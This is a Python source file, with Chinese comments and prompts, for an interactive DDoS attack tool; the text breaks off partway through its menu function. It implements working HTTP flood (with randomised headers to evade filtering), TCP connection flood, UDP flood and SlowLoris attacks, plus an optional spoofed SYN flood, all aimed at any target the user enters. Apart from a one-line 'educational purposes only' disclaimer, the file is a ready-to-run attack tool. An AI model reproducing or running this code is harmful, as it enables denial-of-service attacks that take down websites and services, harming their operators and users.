#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
DDoS Attack Tool
This script is for educational purposes only.
Do not use against any network or website without explicit permission.
"""

import argparse
import socket
import random
import sys
import time
import threading
import logging
import requests
import os
import json
from colorama import Fore, Style, init
from datetime import datetime
import ctypes

# 尝试导入Scapy扩展模块
try:
    from ddos_scapy_ext import start_scapy_syn_flood, randomize_ip
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print(f"{Fore.RED}[!] Scapy模块导入失败。如需使用高级SYN攻击，请确保已安装scapy库。{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[提示] 可使用命令安装: python3 -m pip install scapy{Style.RESET_ALL}")

# 初始化 colorama
init()

# 设置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("ddos_attack.log"),
        logging.StreamHandler()
    ]
)

# 全局变量
stop_flag = False
packet_count = 0
thread_count = 0

def is_root():
    """检查当前用户是否拥有root/管理员权限"""
    if os.name == 'nt':  # Windows
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    else:  # Unix/Linux/MacOS
        return os.geteuid() == 0

def validate_ip(ip):
    """验证IP地址格式"""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def check_target_availability(target, port, timeout=2):
    """检查目标是否可达"""
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.close()
        return True
    except:
        return False

def get_ip_from_domain(domain):
    """从域名获取IP地址"""
    # 基本验证
    if not domain or len(domain) > 255:
        return None
    
    # 处理URL，移除协议前缀和路径
    if domain.startswith(('http://', 'https://')):
        # 移除协议前缀
        domain = domain.split('://', 1)[1]
    
    # 移除路径部分（如果有）
    domain = domain.split('/', 1)[0]
    
    # 移除端口号（如果有）
    domain = domain.split(':', 1)[0]
    
    # 简单验证格式
    # 域名标签最长为63个字符，整个域名不超过253字符
    if any(len(label) > 63 for label in domain.split('.')):
        raise ValueError("域名标签过长，每个标签最多允许63个字符")
    
    if not all(label and all(c.isalnum() or c == '-' for c in label) and not label.startswith('-') and not label.endswith('-') 
              for label in domain.split('.')):
        raise ValueError("域名格式不正确，只允许字母、数字和连字符，且连字符不能在标签的开头或结尾")
    
    try:
        return socket.gethostbyname(domain)
    except socket.gaierror as e:
        raise ValueError(f"无法解析域名: {str(e)}")
    except UnicodeError as e:
        raise ValueError(f"域名编码错误: {str(e)}")
    except Exception as e:
        raise ValueError(f"未知错误: {str(e)}")

def generate_random_data(size):
    """生成随机数据"""
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return ''.join(random.choice(chars) for _ in range(size))

def get_random_user_agent():
    """获取随机User-Agent"""
    user_agents = [
        # 常见浏览器
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
        # 移动设备
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
        # 旧版浏览器
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
        # 搜索引擎爬虫
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    ]
    return random.choice(user_agents)

def generate_random_headers():
    """生成随机HTTP头部"""
    # 基本头部
    headers = {
        "User-Agent": get_random_user_agent(),
        "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9", "zh-CN,zh;q=0.9", "ja-JP,ja;q=0.9"]),
        "Accept-Encoding": random.choice(["gzip, deflate", "gzip, deflate, br", "gzip", "deflate", "br"]),
        "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store, no-cache, must-revalidate"]),
        "Connection": random.choice(["keep-alive", "close"]),
        "Upgrade-Insecure-Requests": "1"
    }
    
    # 随机添加额外头部
    extra_headers = {
        "Accept": random.choice([
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "*/*",
            "application/json, text/javascript, */*; q=0.01"
        ]),
        "DNT": random.choice(["1", "0"]),
        "Sec-Fetch-Dest": random.choice(["document", "empty", "image", "script", "style"]),
        "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors", "same-origin"]),
        "Sec-Fetch-Site": random.choice(["same-origin", "cross-site", "same-site", "none"]),
        "Sec-Fetch-User": random.choice(["?1", ""]),
        "Sec-CH-UA": '"Google Chrome";v="96", "Chromium";v="96", ";Not A Brand";v="99"',
        "Sec-CH-UA-Mobile": random.choice(["?0", "?1"]),
        "Sec-CH-UA-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"', '"Android"', '"iOS"']),
        "Referer": f"https://{generate_random_data(8)}.com/{generate_random_data(5)}",
        "Origin": f"https://{generate_random_data(8)}.com"
    }
    
    # 随机选择一些额外头部添加
    for header, value in extra_headers.items():
        if random.random() > 0.3:  # 70%的概率添加此头部
            headers[header] = value
    
    # 随机添加一些自定义头部
    if random.random() > 0.5:  # 50%的概率添加自定义头部
        headers[f"X-{generate_random_data(8)}"] = generate_random_data(15)
    
    # 随机添加Cookie
    if random.random() > 0.3:  # 70%的概率添加Cookie
        cookies = []
        for _ in range(random.randint(1, 4)):
            cookies.append(f"{generate_random_data(8)}={generate_random_data(15)}")
        headers["Cookie"] = "; ".join(cookies)
    
    return headers

def http_flood(target, port, duration, user_agent="Mozilla/5.0", thread_id=0, use_post=False, data_size=2048):
    """HTTP洪水攻击"""
    global packet_count, stop_flag
    timeout = time.time() + duration
    success_count = 0
    fail_count = 0
    first_error = None
    
    session = requests.Session()
    
    while time.time() < timeout and not stop_flag:
        try:
            # 生成随机参数和路径
            random_param = random.randint(1, 100000)
            random_path = random.choice(['', 'index.html', 'home', 'products', 'about', 'contact', 'news', 'blog', 'login', 'register', 'search'])
            
            # 构造URL，随机选择是否使用www子域名
            if random.random() > 0.5 and not target.startswith(('www.')):
                request_target = f"www.{target}"
            else:
                request_target = target
                
            url = f"http://{request_target}:{port}/{random_path}?id={random_param}&r={generate_random_data(5)}"
            
            # 为每个请求生成新的随机头部
            headers = generate_random_headers()
            if user_agent != "random":
                headers["User-Agent"] = user_agent
            
            # 添加一个随机延迟，避免请求过于规律
            if random.random() > 0.7:  # 30%的概率添加小延迟
                time.sleep(random.uniform(0.1, 0.3))
            
            if use_post:
                # 每次请求更新随机数据
                post_data = {
                    "data": generate_random_data(data_size),
                    "timestamp": str(time.time()),
                    "id": str(random.randint(1000000, 9999999)),
                    "action": random.choice(["search", "submit", "update", "delete", "create"]),
                    "type": random.choice(["user", "product", "article", "comment", "order"]),
                }
                
                # 随机添加一些额外字段
                for _ in range(random.randint(0, 3)):
                    post_data[generate_random_data(8)] = generate_random_data(12)
                
                response = session.post(url, headers=headers, data=post_data, timeout=3)
                request_type = "POST"
            else:
                response = session.get(url, headers=headers, timeout=3)
                request_type = "GET"
            
            # 检查响应状态码    
            if response.status_code >= 200 and response.status_code < 400:
                success_count += 1
            else:
                fail_count += 1
                if first_error is None:
                    first_error = f"HTTP错误: {response.status_code}"
                
            packet_count += 1
            if thread_id == 0:  # 只在主线程显示
                sys.stdout.write(f"\r{Fore.GREEN}[+] 已发送 {packet_count} 个HTTP {request_type}请求 (成功: {success_count}, 失败: {fail_count}){Style.RESET_ALL}")
                sys.stdout.flush()
        except Exception as e:
            fail_count += 1
            if first_error is None:
                first_error = str(e)
            # 只记录少量错误避免刷屏
            if fail_count < 5 or fail_count % 100 == 0:
                if thread_id == 0:
                    error_type = type(e).__name__
                    sys.stdout.write(f"\r{Fore.YELLOW}[!] HTTP请求失败: {error_type}: {str(e)[:50]}...{Style.RESET_ALL}" + " " * 30 + "\n")
                    sys.stdout.flush()
    
    # 返回攻击统计信息
    return success_count, fail_count, first_error

def tcp_syn_flood(target, port, duration, thread_id=0):
    """TCP SYN洪水攻击"""
    global packet_count, stop_flag
    timeout = time.time() + duration
    success_count = 0
    fail_count = 0
    first_error = None
    
    while time.time() < timeout and not stop_flag:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)  # 设置连接超时
            s.connect((target, port))
            packet_count += 1
            success_count += 1
            if thread_id == 0:  # 只在主线程显示
                sys.stdout.write(f"\r{Fore.GREEN}[+] 已发送 {packet_count} 个TCP SYN包 (成功: {success_count}, 失败: {fail_count}){Style.RESET_ALL}")
                sys.stdout.flush()
        except Exception as e:
            fail_count += 1
            if first_error is None:
                first_error = str(e)
            # 只记录少量错误避免刷屏
            if fail_count < 5 or fail_count % 100 == 0:
                if thread_id == 0:
                    error_type = type(e).__name__
                    sys.stdout.write(f"\r{Fore.YELLOW}[!] TCP连接失败: {error_type}: {str(e)[:50]}...{Style.RESET_ALL}" + " " * 30 + "\n")
                    sys.stdout.flush()
        finally:
            try:
                s.close()
            except:
                pass
    
    # 返回攻击统计信息
    return success_count, fail_count, first_error

def udp_flood(target, port, duration, size=1024, thread_id=0):
    """UDP洪水攻击"""
    global packet_count, stop_flag
    timeout = time.time() + duration
    success_count = 0
    fail_count = 0
    first_error = None
    
    while time.time() < timeout and not stop_flag:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = generate_random_data(size)
            s.sendto(data.encode(), (target, port))
            packet_count += 1
            success_count += 1
            if thread_id == 0:  # 只在主线程显示
                sys.stdout.write(f"\r{Fore.GREEN}[+] 已发送 {packet_count} 个UDP包 (成功: {success_count}, 失败: {fail_count}){Style.RESET_ALL}")
                sys.stdout.flush()
        except Exception as e:
            fail_count += 1
            if first_error is None:
                first_error = str(e)
            # 只记录少量错误避免刷屏
            if fail_count < 5 or fail_count % 100 == 0:
                if thread_id == 0:
                    error_type = type(e).__name__
                    sys.stdout.write(f"\r{Fore.YELLOW}[!] UDP发送失败: {error_type}: {str(e)[:50]}...{Style.RESET_ALL}" + " " * 30 + "\n")
                    sys.stdout.flush()
        finally:
            try:
                s.close()
            except:
                pass
    
    # 返回攻击统计信息
    return success_count, fail_count, first_error

def slowloris_attack(target, port, duration, socket_count=150, thread_id=0):
    """
    SlowLoris攻击 - 保持大量半开HTTP连接
    这种攻击特别针对Web服务器，通过建立并保持多个不完整的HTTP请求，消耗服务器连接池资源
    """
    global packet_count, stop_flag
    
    # 创建套接字列表
    socket_list = []
    headers = [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept-language: en-US,en,q=0.5",
        "Connection: keep-alive"
    ]
    
    # 随机HTTP头部组件
    extra_headers = [
        f"X-{generate_random_data(10)}: {generate_random_data(20)}",
        f"Cookie: {generate_random_data(15)}={generate_random_data(30)}",
        f"Referer: http://{generate_random_data(8)}.com/{generate_random_data(5)}",
    ]
    
    timeout = time.time() + duration
    success_count = 0
    fail_count = 0
    connect_fail_count = 0
    first_error = None
    
    try:
        # 创建初始连接
        for _ in range(socket_count):
            if stop_flag:
                break
                
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target, port))
                s.send(f"GET /?{random.randint(1, 2000)} HTTP/1.1\r\n".encode("utf-8"))
                
                # 发送部分HTTP头部，但不发送最终的\r\n
                for header in headers:
                    s.send(f"{header}\r\n".encode("utf-8"))
                    
                # 添加随机的额外头部
                s.send(f"{random.choice(extra_headers)}\r\n".encode("utf-8"))
                
                socket_list.append(s)
                packet_count += 1
                success_count += 1
                
                if thread_id == 0:  # 只在主线程显示
                    sys.stdout.write(f"\r{Fore.GREEN}[+] SlowLoris: 维持 {len(socket_list)} 个连接 (成功: {success_count}, 连接失败: {connect_fail_count}){Style.RESET_ALL}")
                    sys.stdout.flush()
            except Exception as e:
                connect_fail_count += 1
                if first_error is None:
                    first_error = str(e)
                # 只记录少量错误避免刷屏
                if connect_fail_count < 5 or connect_fail_count % 50 == 0:
                    if thread_id == 0:
                        error_type = type(e).__name__
                        sys.stdout.write(f"\r{Fore.YELLOW}[!] SlowLoris连接失败: {error_type}: {str(e)[:50]}...{Style.RESET_ALL}" + " " * 30 + "\n")
                        sys.stdout.flush()
                continue
        
        # 如果没有成功建立任何连接，则返回
        if not socket_list:
            if thread_id == 0:
                sys.stdout.write(f"\r{Fore.RED}[!] SlowLoris攻击失败: 无法建立任何连接{Style.RESET_ALL}\n")
                sys.stdout.flush()
            return success_count, connect_fail_count, first_error
        
        # 保持连接活跃
        keep_alive_count = 0
        while time.time() < timeout and not stop_flag:
            # 尝试替换断开的连接
            if len(socket_list) < socket_count:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((target, port))
                    s.send(f"GET /?{random.randint(1, 2000)} HTTP/1.1\r\n".encode("utf-8"))
                    for header in headers:
                        s.send(f"{header}\r\n".encode("utf-8"))
                    socket_list.append(s)
                    packet_count += 1
                    success_count += 1
                except Exception as e:
                    connect_fail_count += 1
                    # 不用重复记录错误
            
            # 为所有连接发送保活数据
            keep_alive_failures = 0
            for i, s in enumerate(list(socket_list)):
                try:
                    # 发送部分数据以保持连接活跃，但永不完成请求
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                    keep_alive_count += 1
                except Exception as e:
                    # 如果连接已断开，从列表中移除
                    try:
                        socket_list.remove(s)
                    except:
                        pass
                    keep_alive_failures += 1
                    continue
            
            if thread_id == 0:  # 只在主线程显示
                sys.stdout.write(f"\r{Fore.GREEN}[+] SlowLoris: 维持 {len(socket_list)} 个连接，已发送 {keep_alive_count} 次保活数据，连接失败: {connect_fail_count}{Style.RESET_ALL}")
                sys.stdout.flush()
            
            # 短暂休息，避免CPU过载
            time.sleep(15)
    
    finally:
        # 关闭所有连接
        for s in socket_list:
            try:
                s.close()
            except:
                pass
    
    # 返回攻击统计信息
    return success_count, connect_fail_count, first_error

def save_attack_results(attack_type, target, port, duration, packet_count, start_time, end_time, threads):
    """保存攻击结果到JSON文件"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"ddos_attack_results_{timestamp}.json"
    
    results = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "attack_type": attack_type,
        "target": target,
        "port": port,
        "duration": f"{duration:.2f} seconds",
        "threads": threads,
        "packets_sent": packet_count,
        "packets_per_second": f"{packet_count/duration:.2f}" if duration > 0 else "N/A",
        "start_time": start_time,
        "end_time": end_time
    }
    
    try:
        with open(filename, 'w') as f:
            json.dump(results, f, indent=4)
        print(f"{Fore.YELLOW}[*] 攻击结果已保存到: {filename}{Style.RESET_ALL}")
        return True
    except Exception as e:
        print(f"{Fore.RED}[!] 保存结果失败: {str(e)}{Style.RESET_ALL}")
        return False

def start_attack(attack_type, target, port, duration, threads, packet_size=1024, user_agent="Mozilla/5.0", 
               use_scapy=False, http_post=False, http_data_size=2048, socket_count=150):
    """启动攻击"""
    global packet_count, thread_count, stop_flag
    
    # 检查线程数量，并设置一个合理的上限
    MAX_THREADS = 200  # 设置一个合理的最大线程数
    if threads > MAX_THREADS:
        print(f"{Fore.YELLOW}[!] 警告: 请求的线程数 ({threads}) 过多，已限制为 {MAX_THREADS}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] 过多线程可能导致系统资源耗尽或性能下降{Style.RESET_ALL}")
        threads = MAX_THREADS
    
    # 对SlowLoris攻击类型的每线程连接数进行限制
    if attack_type == "SLOWLORIS":
        MAX_CONNECTIONS_PER_THREAD = 100
        if socket_count > MAX_CONNECTIONS_PER_THREAD:
            print(f"{Fore.YELLOW}[!] 警告: 每线程连接数 ({socket_count}) 过多，已限制为 {MAX_CONNECTIONS_PER_THREAD}{Style.RESET_ALL}")
            socket_count = MAX_CONNECTIONS_PER_THREAD
    
    # 检查Scapy攻击所需的权限
    if use_scapy and attack_type == "SYN":
        if not SCAPY_AVAILABLE:
            print(f"{Fore.RED}[!] Scapy模块不可用，将使用普通TCP SYN攻击{Style.RESET_ALL}")
            use_scapy = False
            attack_type = "TCP"  # 将攻击类型改为TCP
        elif not is_root():
            print(f"{Fore.RED}[!] 警告: Scapy SYN攻击需要root/管理员权限{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] 在macOS/Linux上，请使用 'sudo python3 ddos_attack.py' 运行{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] 在Windows上，请以管理员身份运行命令提示符{Style.RESET_ALL}")
            choice = input(f"{Fore.GREEN}是否继续使用普通TCP SYN攻击? (y/n): {Style.RESET_ALL}")
            if choice.lower() != 'y':
                return
            use_scapy = False
            attack_type = "TCP"  # 将攻击类型改为TCP
    
    # 使用Scapy进行SYN攻击
    if use_scapy and attack_type == "SYN":
        print(f"{Fore.YELLOW}[*] 使用Scapy进行TCP SYN洪水攻击{Style.RESET_ALL}")
        try:
            start_scapy_syn_flood(target, port, duration, threads, True, True)
        except Exception as e:
            print(f"{Fore.RED}[!] Scapy攻击失败: {str(e)}{Style.RESET_ALL}")
            if "Permission denied" in str(e):
                print(f"{Fore.YELLOW}[*] 错误原因: 权限不足。macOS/Linux需要root权限运行Scapy。{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[*] 请使用 'sudo python3 ddos_attack.py' 重新运行{Style.RESET_ALL}")
            return
        return
    
    packet_count = 0
    stop_flag = False
    thread_list = []
    
    # 检查目标可达性
    print(f"{Fore.YELLOW}[*] 正在检查目标 {target}:{port} 的可达性...{Style.RESET_ALL}")
    is_reachable = check_target_availability(target, port)
    if not is_reachable:
        print(f"{Fore.RED}[!] 警告: 目标 {target}:{port} 不可达!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] 可能原因: 目标服务器离线、防火墙拦截或网络问题{Style.RESET_ALL}")
        choice = input(f"{Fore.GREEN}是否仍要继续攻击? (y/n): {Style.RESET_ALL}")
        if choice.lower() != 'y':
            return
    else:
        print(f"{Fore.GREEN}[+] 目标 {target}:{port} 可达，可以进行攻击{Style.RESET_ALL}")
    
    print(f"{Fore.YELLOW}[*] 开始 {attack_type} 攻击 {target}:{port}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] 攻击持续时间: {duration} 秒{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] 线程数: {threads}{Style.RESET_ALL}")
    
    start_time = time.time()
    start_time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # 用于保存攻击统计信息
    total_success = 0
    total_failures = 0
    error_samples = []
    
    # 创建并启动线程
    try:
        for i in range(threads):
            if attack_type == "HTTP":
                t = threading.Thread(target=http_flood, args=(target, port, duration, user_agent, i, http_post, http_data_size))
            elif attack_type == "TCP":
                t = threading.Thread(target=tcp_syn_flood, args=(target, port, duration, i))
            elif attack_type == "UDP":
                t = threading.Thread(target=udp_flood, args=(target, port, duration, packet_size, i))
            elif attack_type == "SLOWLORIS":
                # SlowLoris攻击通常不需要太多线程，因为每个线程已经维持多个连接
                t = threading.Thread(target=slowloris_attack, args=(target, port, duration, socket_count, i))
            else:
                print(f"{Fore.RED}[!] 未知的攻击类型{Style.RESET_ALL}")
                return
            
            thread_list.append(t)
            t.daemon = True
            t.start()
            thread_count += 1
    except RuntimeError as e:
        print(f"{Fore.RED}[!] 无法创建更多线程: {str(e)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] 建议减少线程数或关闭其他应用程序释放系统资源{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] 将继续使用已创建的 {len(thread_list)} 个线程进行攻击{Style.RESET_ALL}")
    
    try:
        # 等待攻击完成
        main_thread = threading.current_thread()
        for t in threading.enumerate():
            if t is not main_thread:
                t.join()
    except KeyboardInterrupt:
        stop_flag = True
        print(f"{Fore.RED}[!] 攻击被用户中断{Style.RESET_ALL}")
    
    end_time = time.time()
    end_time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    attack_duration = end_time - start_time
    
    print(f"\n{Fore.YELLOW}[*] 攻击完成{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] 攻击持续时间: {attack_duration:.2f} 秒{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] 共发送数据包: {packet_count}{Style.RESET_ALL}")
    
    # 当数据包为0时，显示可能的原因
    if packet_count == 0:
        print(f"{Fore.RED}[!] 警告: 未能成功发送任何数据包!{Style.RESET_ALL}")
        if not is_reachable:
            print(f"{Fore.YELLOW}[*] 失败原因: 目标 {target}:{port} 不可达{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[*] 可能的原因:{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] 1. 网络连接问题{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] 2. 防火墙拦截{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] 3. 服务器拒绝连接{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] 4. 主机可能在线但端口未开放{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] 建议: 尝试不同的攻击类型或端口{Style.RESET_ALL}")
    
    if attack_duration > 0:
        print(f"{Fore.YELLOW}[*] 平均每秒发送包数: {packet_count/attack_duration:.2f}{Style.RESET_ALL}")
    
    # 询问是否保存攻击结果
    save_choice = input(f"{Fore.GREEN}是否保存攻击结果? (y/n): {Style.RESET_ALL}")
    if save_choice.lower() == 'y':
        save_attack_results(attack_type, target, port, attack_duration, packet_count, start_time_str, end_time_str, threads)

def show_banner():
    """显示工具横幅"""
    banner = f"""
{Fore.RED}
██████╗ ██████╗  ██████╗ ███████╗    █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
██║  ██║██║  ██║██║   ██║███████╗   ███████║   ██║      ██║   ███████║██║     █████╔╝ 
██║  ██║██║  ██║██║   ██║╚════██║   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
██████╔╝██████╔╝╚██████╔╝███████║   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
{Style.RESET_ALL}
{Fore.YELLOW}===========================================================================
{Fore.CYAN}DDoS 攻击工具 - 仅供教育目的，请负责任地使用{Style.RESET_ALL}
{Fore.YELLOW}===========================================================================
"""
    print(banner)

def interactive_menu():
    """交互式菜单"""
    show_banner()
    
    print(f"{Fore.CYAN}请选择攻击类型:{Style.RESET_ALL}")
    print(f"{Fore.CYAN}1. HTTP洪水攻击{Style.RESET_ALL}")
    print(f"{Fore.CYAN}2. TCP SYN洪水攻击{Style.RESET_ALL}")
    print(f"{Fore.CYAN}3. UDP洪水攻击{Style.RESET_ALL}")
    print(f"{Fore.CYAN}4. SlowLoris攻击{Style.RESET_ALL}")
    if SCAPY_AVAILABLE:
        print(f"{Fore.CYAN}5. Scapy TCP SYN洪水攻击 (高级){Style.RESET_ALL}")
        print(f"{Fore.CYAN}6. 退出{Style.RESET_ALL}")
        max_choice = 6
    else:
        print(f"{Fore.CYAN}5. 退出{Style.RESET_ALL}")
        max_choice = 5
    
    try:
        choice = input(f"{Fore.GREEN}请输入选择 (1-{max_choice}): {Style.RESET_ALL}")
        
        if choice == str(max_choice):
            print(f"{Fore.YELLOW}[*] 退出程序{Style.RESET_ALL}")
            sys.exit(0)
        
        if choice not in [str(i) for i in range(1, max_choice)]:
            print(f"{Fore.RED}[!] 无效的选择，请重试{Style.RESET_ALL}")
            return interactive_menu()
    except ValueError:
        print(f"{Fore.RED}[!] 无效的选择，请重试{Style.RESET_ALL}")
        return interactive_menu()
    
    # 循环直到获取有效的域名或IP地址
    while True:
        target = input(f"{Fore.GREEN}请输入目标 IP/域名: {Style.RESET_ALL}")
        
        # 检查输入长度和有效性
        if not target or len(target) > 255:  # 域名最大长度为255字符
            print(f"{Fore.RED}[!] 输入无效：域名或IP地址为空或过长{Style.RESET_ALL}")
            continue
            
        # 验证是否为IP地址
        if validate_ip(target):
            break
            
        # 如果不是IP，尝试解析域名
        try:
            ip = get_ip_from_domain(target)
            if ip:
                print(f"{Fore.YELLOW}[*] 域名 {target} 解析为 IP: {ip}{Style.RESET_ALL}")
                target = ip
                break
            else:
                print(f"{Fore.RED}[!] 无法解析域名 {target}{Style.RESET_ALL}")
                continue
        except Exception as e:
            print(f"{Fore.RED}[!] 域名解析错误: {str(e)}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] 请输入有效的IP地址或域名 (例如: example.com 或 192.168.1.1){Style.RESET_ALL}")
            continue
    
    try:
        port = int(input(f"{Fore.GREEN}请输入目标端口: {Style.RESET_ALL}"))
        if port < 1 or port > 65535:
            print(f"{Fore.RED}[!] 端口范围应为 1-65535{Style.RESET_ALL}")
            return interactive_menu()
    except ValueError:
        print(f"{Fore.RED}[!] 端口应为整数{Style.RESET_ALL}")
        return interactive_menu()
    
    # 检查目标可达性
    print(f"{Fore.YELLOW}[*] 正在检查目标 {target}:{port} 的可达性...{Style.RESET_ALL}")
    if not check_target_availability(target, port):
        print(f"{Fore.RED}[!] 目标 {target}:{port} 不可达，请检查目标或网络连接{Style.RESET_ALL}")
        retry = input(f"{Fore.GREEN}是否仍要继续攻击? (y/n): {Style.RESET_ALL}")
        if retry.lower() != 'y':
            return interactive_menu()
    else:
        print(f"{Fore.GREEN}[+] 目标 {target}:{port} 可达，可以进行攻击{Style.RESET_ALL}")
    
    try:
        duration = int(input(f"{Fore.GREEN}请输入攻击持续时间(秒): {Style.RESET_ALL}"))
        if duration < 1:
            print(f"{Fore.RED}[!] 持续时间应大于0{Style.RESET_ALL}")
            return interactive_menu()
    except ValueError:
        print(f"{Fore.RED}[!] 持续时间应为整数{Style.RESET_ALL}")
        return interactive_menu()
    
    try:
        thread_input = input(f"{Fore.GREEN}请输入线程数 (推荐 10-50，默认 20): {Style.RESET_ALL}")
        if not thread_input:
            threads = 20  # 设置默认值
            print(f"{Fore.YELLOW}[*] 使用默认线程数: 20{Style.RESET_ALL}")
        else:
            threads = int(thread_input)
            if threads < 1:
                print(f"{Fore.RED}[!] 线程数应大于0，将使用默认值20{Style.RESET_ALL}")
                threads = 20
            elif threads > 200:
                print(f"{Fore.YELLOW}[!] 警告: 线程数过多可能导致系统资源耗尽{Style.RESET_ALL}")
                confirm = input(f"{Fore.GREEN}是否继续使用 {threads} 个线程? (y/n，选n将使用100个线程): {Style.RESET_ALL}")
                if confirm.lower() != 'y':
                    threads = 100
                    print(f"{Fore.YELLOW}[*] 已调整为 100 个线程{Style.RESET_ALL}")
    except ValueError:
        print(f"{Fore.RED}[!] 线程数应为整数，将使用默认值20{Style.RESET_ALL}")
        threads = 20
    
    if choice == "1":
        attack_type = "HTTP"
        user_agent_choice = input(f"{Fore.GREEN}请选择User-Agent (1. 默认Mozilla/5.0, 2. 随机User-Agent): {Style.RESET_ALL}")
        if user_agent_choice == "2":
            user_agent = "random"
            print(f"{Fore.YELLOW}[*] 将使用随机User-Agent{Style.RESET_ALL}")
        else:
            user_agent = input(f"{Fore.GREEN}请输入自定义User-Agent (留空使用默认Mozilla/5.0): {Style.RESET_ALL}")
            if not user_agent:
                user_agent = "Mozilla/5.0"
        
        use_post = input(f"{Fore.GREEN}是否使用POST请求? (y/n, 默认为n): {Style.RESET_ALL}")
        use_post = use_post.lower() == 'y'
        
        if use_post:
            try:
                data_size = int(input(f"{Fore.GREEN}请输入POST数据大小(字节): {Style.RESET_ALL}"))
                if data_size < 1:
                    print(f"{Fore.RED}[!] 数据大小应大于0，将使用默认值2048{Style.RESET_ALL}")
